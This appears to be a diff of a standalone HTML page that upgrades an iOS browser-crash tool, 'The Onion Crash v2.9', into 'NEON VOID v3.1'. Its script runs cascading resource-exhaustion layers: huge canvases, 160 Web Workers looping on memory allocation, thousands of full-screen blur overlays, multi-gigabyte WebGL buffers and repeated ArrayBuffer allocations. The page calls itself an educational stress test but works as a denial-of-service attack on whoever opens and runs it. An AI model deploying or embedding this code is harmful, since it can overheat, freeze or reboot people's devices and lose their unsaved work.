@@ -3,171 +3,249 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>The Onion Crash v2.9 — iOS 26.5 ULTRA</title>
+    <title>NEON VOID v3.1</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-        :root { --pink: #ff00ff; --cyan: #00ffff; --red: #ff0044; }
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Orbitron:wght@500;700&display=swap');
+        
+        :root {
+            --void-pink: #ff00ff;
+            --void-cyan: #00f7ff;
+            --void-red: #ff0066;
+        }
+        
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: #0a000f; color: #00ffcc; font-family: 'Press Start 2P', system-ui;
-            height: 100vh; overflow-y: auto; display: flex; align-items: center; justify-content: center; position: relative;
+            background: #0c0018;
+            color: #a0ffe0;
+            font-family: 'Press Start 2P', system-ui;
+            height: 100vh;
+            overflow-y: auto;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .grid { position: absolute; inset: 0; background: linear-gradient(rgba(255,0,255,0.07) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.07) 1px, transparent 1px); background-size: 30px 30px; animation: gridMove 10s linear infinite; z-index: 0; }
-        @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-200px -200px} }
-        .scanline { position: absolute; inset: 0; background: linear-gradient(transparent 50%, rgba(255,30,90,0.2) 50%); background-size: 100% 4px; animation: scan 2s linear infinite; z-index: 1; }
-        @keyframes scan { 0%{transform:translateY(-200%)} 100%{transform:translateY(500%)} }
-        .container {
-            position: relative; z-index: 2; width: 94%; max-width: 800px;
-            background: rgba(15,0,35,0.97); border: 6px solid var(--pink);
-            box-shadow: 0 0 90px var(--pink), 0 0 40px var(--red); padding: 50px 30px; border-radius: 20px;
+        
+        .bg {
+            position: absolute;
+            inset: 0;
+            background: 
+                radial-gradient(circle at 50% 50%, rgba(255,0,255,0.08) 0%, transparent 70%),
+                linear-gradient(rgba(0,255,255,0.06) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px);
+            background-size: 80px 80px;
+            animation: voidPulse 15s linear infinite;
+            z-index: 0;
         }
-        h1 { font-size: 2.9em; color: var(--pink); text-shadow: 0 0 35px var(--pink); animation: flicker 0.5s infinite alternate; }
-        @keyframes flicker { 0% {opacity:0.7} 100% {opacity:1} }
+        @keyframes voidPulse { 0% {opacity:0.6} 50% {opacity:1} 100% {opacity:0.6} }
+        
+        .glow-container {
+            position: relative;
+            z-index: 2;
+            width: 92%;
+            max-width: 860px;
+            background: rgba(18, 4, 48, 0.92);
+            border: 7px solid var(--void-pink);
+            box-shadow: 
+                0 0 40px var(--void-pink),
+                0 0 90px var(--void-cyan),
+                0 0 140px rgba(255,0,100,0.6),
+                inset 0 0 60px rgba(0,247,255,0.25);
+            border-radius: 24px;
+            padding: 50px 40px;
+            text-align: center;
+            backdrop-filter: blur(16px);
+        }
+        
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3.4em;
+            color: var(--void-pink);
+            text-shadow: 
+                0 0 20px var(--void-pink),
+                0 0 50px var(--void-red),
+                0 0 80px #ff00ff;
+            animation: neonFlicker 1.2s infinite alternate;
+            margin-bottom: 8px;
+        }
+        @keyframes neonFlicker {
+            0% { opacity: 0.85; text-shadow: 0 0 20px var(--void-pink); }
+            100% { opacity: 1; text-shadow: 0 0 60px var(--void-red); }
+        }
+        
+        .subtitle {
+            font-size: 1.35em;
+            color: var(--void-cyan);
+            text-shadow: 0 0 20px var(--void-cyan);
+            margin-bottom: 35px;
+        }
+        
+        .warning {
+            background: linear-gradient(145deg, #4a0000, #220000);
+            border: 5px solid #ff3366;
+            padding: 28px;
+            margin: 30px 0;
+            border-radius: 16px;
+            color: #ffbbbb;
+            font-size: 0.98em;
+            box-shadow: 0 0 30px #ff3366;
+        }
+        
         button {
-            font-family: 'Press Start 2P', system-ui; padding: 28px 75px; font-size: 1.55em;
-            background: transparent; color: #00ff99; border: 6px solid #00ff99;
-            cursor: pointer; box-shadow: 0 0 55px #00ff99; transition: all 0.4s;
-            display: block; margin: 35px auto;
+            font-family: 'Press Start 2P', system-ui;
+            padding: 26px 90px;
+            font-size: 1.65em;
+            background: transparent;
+            color: var(--void-cyan);
+            border: 7px solid var(--void-cyan);
+            cursor: pointer;
+            box-shadow: 0 0 60px var(--void-cyan);
+            transition: all 0.35s;
+            text-transform: uppercase;
+            letter-spacing: 3px;
         }
-        button:hover { background:#00ff99; color:#000; transform:scale(1.15); }
-        #progress, #status { margin: 30px 0; padding: 22px; background: #000000dd; border: 3px solid var(--cyan); font-size: 0.97em; text-align: left; display: none; }
+        button:hover {
+            background: var(--void-cyan);
+            color: #000;
+            transform: scale(1.08);
+            box-shadow: 0 0 100px var(--void-cyan);
+        }
+        
+        #progress, #status {
+            margin: 30px 0;
+            padding: 22px;
+            background: rgba(0,0,0,0.85);
+            border: 3px solid var(--void-cyan);
+            text-align: left;
+            font-size: 0.96em;
+            display: none;
+        }
         #status { height: 280px; overflow-y: auto; }
+        
+        .history { margin-top: 45px; text-align: left; }
     </style>
 </head>
 <body>
-    <div class="grid"></div>
-    <div class="scanline"></div>
+    <div class="bg"></div>
     
-    <div class="container">
-        <h1>🧅 THE ONION CRASH v2.9</h1>
-        <p style="color:#ff0088; text-align:center; margin:15px 0 35px;">iOS 26.5 ULTRA PRESSURE</p>
+    <div class="glow-container">
+        <h1>NEON VOID</h1>
+        <div class="subtitle">v3.1 — ULTIMATE SYSTEM COLLAPSE</div>
         
-        <div style="background:rgba(180,0,0,0.55); border:5px solid #ff2222; padding:28px; margin:30px 0; color:#ffdddd; border-radius:12px;">
-            <strong>⚠️ МАКСИМАЛЬНО ЖЁСТКИЙ СТРЕСС-ТЕСТ</strong><br>
-            Только тестовое устройство. Может сильно нагреть телефон и вызвать ребут.
+        <div class="warning">
+            <strong>⚠️ EDUCATIONAL STRESS TEST ONLY</strong><br><br>
+            Запуск может привести к перегреву, respring или полной перезагрузке устройства.<br>
+            Используй исключительно на своём тестовом iPhone.
         </div>
         
-        <button id="runBtn">▶ ЗАПУСТИТЬ ULTRA CASCADE</button>
+        <button id="mainBtn">▶ ACTIVATE VOID CASCADE</button>
         
-        <div id="confirm" style="display:none; margin:30px 0; text-align:center;">
-            <p style="color:#ff5555; font-size:1.3em;">ТЕЛЕФОН МОЖЕТ ПЕРЕГРЕТЬСЯ И ПЕРЕЗАГРУЗИТЬСЯ!<br>Продолжить?</p>
-            <button id="confirmYes" style="background:#550000; color:white; border:5px solid #ff4444; padding:22px 60px;">ДА, Я ГОТОВ</button>
+        <div id="confirm" style="display:none; margin:30px 0; padding:25px; background:rgba(100,0,0,0.7); border:4px solid #ff3366; border-radius:16px;">
+            <p style="color:#ff9999; font-size:1.25em; line-height:1.5;">
+                ВНИМАНИЕ!<br>
+                Устройство может полностью перезагрузиться.<br>
+                Продолжить?
+            </p>
+            <button id="confirmYes" style="margin-top:15px; background:#660000; color:white; border:5px solid #ff3366; padding:20px 60px;">ДА, АКТИВИРОВАТЬ</button>
         </div>
         
         <div id="progress"></div>
         <div id="status"></div>
         
-        <div class="history" style="margin-top:45px;">
-            <h3 style="color:var(--pink);">📜 ИСТОРИЯ</h3>
+        <div class="history">
+            <h3 style="color:#ff00ff; margin-bottom:15px;">SYSTEM LOG</h3>
             <div id="historyList"></div>
         </div>
     </div>
 
     <script>
+        // Новый порядок: сначала разогрев, потом тотальный хаос
         const LAYERS = [
-            ...Array.from({length:12}, (_,i) => ({group:"PREP", name:`Heavy JIT ${i+1}`, fn: async () => {
-                for(let j=0; j<1200; j++) try { new Function('x', `return x * ${Math.random() * 999999}`)(); } catch(e){}
+            // Разогрев
+            ...Array.from({length:12}, (_,i) => ({group:"WARMUP", name:`JIT Overload ${i+1}`, fn: async () => {
+                for(let j=0; j<2200; j++) try { new Function('x', `return x*${Math.random()*987654}`)(); } catch(e){}
             }})),
-
-            {group:"HIGH", name:"Massive Audio + Canvas", fn:async()=>{
-                const ctx = new (window.AudioContext||window.webkitAudioContext)();
-                for(let i=0;i<800;i++) try{const o=ctx.createOscillator();o.connect(ctx.destination);o.start();}catch(e){}
-                
-                for(let i=0; i<9; i++) {
+            
+            // Основной удар
+            {group:"VOID", name:"CANVAS ARMAGEDDON", fn:async()=>{
+                for(let i=0; i<14; i++) {
                     const c = document.createElement('canvas');
-                    c.width = c.height = 24576;
+                    c.width = c.height = 32768;
                     try {
-                        const gl = c.getContext('2d', {alpha:false});
-                        gl.fillRect(0,0,c.width,c.height);
-                        c.toDataURL('image/png');
-                    } catch(e){}
-                }
-            }},
-
-            {group:"HIGH", name:"INSANE Canvas Bomb", fn:async()=>{
-                for(let i=0; i<10; i++) {
-                    const c = document.createElement('canvas');
-                    c.width = 32768; c.height = 32768;
-                    try {
-                        const ctx = c.getContext('2d', {alpha: false, desynchronized: true});
-                        ctx.fillStyle = '#0ff';
+                        const ctx = c.getContext('2d', {alpha:false, desynchronized:true});
+                        ctx.fillStyle = '#00ffff';
                         ctx.fillRect(0,0,c.width,c.height);
                     } catch(e){}
                 }
             }},
-
-            {group:"HIGH", name:"Worker Memory Apocalypse", fn:async()=>{
-                for(let i=0; i<120; i++) {
+            
+            {group:"VOID", name:"WORKER VOID SWARM", fn:async()=>{
+                for(let i=0; i<160; i++) {
                     try {
-                        const blob = new Blob([`
-                            while(true) {
-                                new ArrayBuffer(1024*1024*160);
-                                let heavy = new Float64Array(20000000);
-                                for(let k=0; k<heavy.length; k++) heavy[k] = k * Math.random();
-                            }
-                        `]);
+                        const blob = new Blob([`while(true){new ArrayBuffer(1024*1024*256);new Float64Array(22000000).fill(Math.random()*999);}`]);
                         new Worker(URL.createObjectURL(blob));
                     } catch(e){}
                 }
             }},
-
-            {group:"HIGH", name:"WebGL Extreme Pressure", fn:async()=>{
+            
+            {group:"VOID", name:"BACKDROP NEXUS", fn:async()=>{
+                for(let i=0; i<6500; i++) {
+                    const d = document.createElement('div');
+                    d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(${240 + Math.random()*140}px);opacity:0.16;z-index:999999;pointer-events:none;`;
+                    document.body.appendChild(d);
+                }
+                await new Promise(r => setTimeout(r, 800));
+            }},
+            
+            {group:"VOID", name:"WEBGL ABYSS", fn:async()=>{
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl2') || c.getContext('webgl');
                 if(gl) {
-                    for(let i=0; i<25; i++) {
+                    for(let i=0; i<40; i++) {
                         try {
                             const buf = gl.createBuffer();
                             gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*2048, gl.STATIC_DRAW);
+                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*3072, gl.STATIC_DRAW);
                         } catch(e){}
                     }
                 }
             }},
-
-            {group:"HIGH", name:"FINAL ULTRA COMBO", fn:async()=>{
-                try { new ArrayBuffer(1024*1024*1024); } catch(e){}
-                await new Promise(r => setTimeout(r, 6500));
-            }},
-
-            ...Array.from({length:50}, (_,i) => ({group:"NUCLEAR", name:`Nuclear Layer ${i+1}`, fn: async () => {
+            
+            // Финальный удар
+            ...Array.from({length:45}, (_,i) => ({group:"VOID", name:`DEEP VOID ${i+1}`, fn: async () => {
                 try {
-                    new ArrayBuffer(1024*1024*280);
-                    const d = document.createElement('div');
-                    d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(320px);opacity:0.18;z-index:999999;pointer-events:none;`;
-                    document.body.appendChild(d);
+                    new ArrayBuffer(1024*1024*380);
                 } catch(e){}
-                await new Promise(r => setTimeout(r, 180));
+                await new Promise(r => setTimeout(r, 140));
             }}))
         ];
 
-        // ... (остальной код без изменений, как в v2.8)
         let currentSession = null;
         let isRunning = false;
 
-        function saveSession() { localStorage.setItem('onionCurrent', JSON.stringify(currentSession)); }
+        function saveSession() { localStorage.setItem('neonVoidCurrent', JSON.stringify(currentSession)); }
 
         function detectPreviousCrash() {
-            const raw = localStorage.getItem('onionCurrent');
+            const raw = localStorage.getItem('neonVoidCurrent');
             if (!raw) return;
             let sess = JSON.parse(raw);
             if (sess.status !== 'running') return;
             const idx = sess.layers.findIndex(l => l.status === 'running');
             if (idx !== -1) sess.layers[idx].status = 'crashed';
             sess.status = 'crashed';
-            let hist = JSON.parse(localStorage.getItem('onionHistory') || '[]');
+            let hist = JSON.parse(localStorage.getItem('neonVoidHistory') || '[]');
             hist.unshift(sess);
-            localStorage.setItem('onionHistory', JSON.stringify(hist.slice(0,12)));
-            localStorage.removeItem('onionCurrent');
+            localStorage.setItem('neonVoidHistory', JSON.stringify(hist.slice(0,12)));
+            localStorage.removeItem('neonVoidCurrent');
         }
 
         function renderHistory() {
             const list = document.getElementById('historyList');
             list.innerHTML = '';
-            JSON.parse(localStorage.getItem('onionHistory') || '[]').slice(0,6).forEach(s => {
+            JSON.parse(localStorage.getItem('neonVoidHistory') || '[]').slice(0,6).forEach(s => {
                 const div = document.createElement('div');
-                div.style = "background:rgba(30,0,50,0.85);padding:14px;margin:10px 0;border-left:7px solid #00ff88;font-size:0.86em;";
-                const crash = s.layers.find(l => l.status==='crashed');
+                div.style = "background:rgba(40,0,70,0.85); padding:14px; margin:9px 0; border-left:7px solid #ff00aa; font-size:0.87em;";
+                const crash = s.layers.find(l => l.status === 'crashed');
                 div.innerHTML = `${s.start.slice(11,19)} — <b>${s.status}</b>${crash ? `<br>💀 ${crash.name}` : ''}`;
                 list.appendChild(div);
             });
@@ -178,10 +256,13 @@
             const stat = document.getElementById('status');
             prog.style.display = 'block';
             stat.style.display = 'block';
-            prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.group} | ${layer.name}`;
-            stat.innerHTML += `<br>→ ${layer.name} ...`;
+            
+            prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.group} • ${layer.name}`;
+            stat.innerHTML += `<br>→ ${layer.name} <span style="color:#ff0">[VOID]</span>`;
+            
             currentSession.layers[idx].status = 'running';
             saveSession();
+            
             try {
                 await layer.fn();
                 currentSession.layers[idx].status = 'completed';
@@ -191,32 +272,45 @@
                 stat.innerHTML += ` <span style="color:#f80">ERR</span>`;
             }
             saveSession();
-            await new Promise(r => setTimeout(r, 120));
+            await new Promise(r => setTimeout(r, 95));
         }
 
-        async function startExploit() {
+        async function startCascade() {
             if (isRunning) return;
             isRunning = true;
-            document.getElementById('runBtn').disabled = true;
-            currentSession = { id: Date.now(), start: new Date().toISOString(), status: 'running', layers: LAYERS.map(l => ({name: l.name, status: 'pending'})) };
+            document.getElementById('mainBtn').disabled = true;
+            
+            currentSession = {
+                id: Date.now(),
+                start: new Date().toISOString(),
+                status: 'running',
+                layers: LAYERS.map(l => ({name: l.name, status: 'pending'}))
+            };
             saveSession();
-            document.getElementById('status').innerHTML = '☢️ ULTRA PRESSURE STARTED...';
+            
+            document.getElementById('status').innerHTML = '🌌 NEON VOID CASCADE ACTIVATED...';
+            
             for (let i = 0; i < LAYERS.length; i++) {
                 if (!isRunning) break;
                 await runLayer(LAYERS[i], i);
             }
+            
             currentSession.status = 'completed';
             saveSession();
-            document.getElementById('status').innerHTML += '<br><span style="color:#0ff">ЗАВЕРШЕНО</span>';
+            document.getElementById('status').innerHTML += '<br><span style="color:#00ffff">VOID COMPLETE</span>';
             isRunning = false;
-            document.getElementById('runBtn').disabled = false;
+            document.getElementById('mainBtn').disabled = false;
         }
 
         window.onload = () => {
             detectPreviousCrash();
             renderHistory();
-            document.getElementById('runBtn').onclick = () => document.getElementById('confirm').style.display = 'block';
-            document.getElementById('confirmYes').onclick = () => { document.getElementById('confirm').style.display = 'none'; startExploit(); };
+            
+            document.getElementById('mainBtn').onclick = () => document.getElementById('confirm').style.display = 'block';
+            document.getElementById('confirmYes').onclick = () => {
+                document.getElementById('confirm').style.display = 'none';
+                startCascade();
+            };
         };
     </script>
 </body>
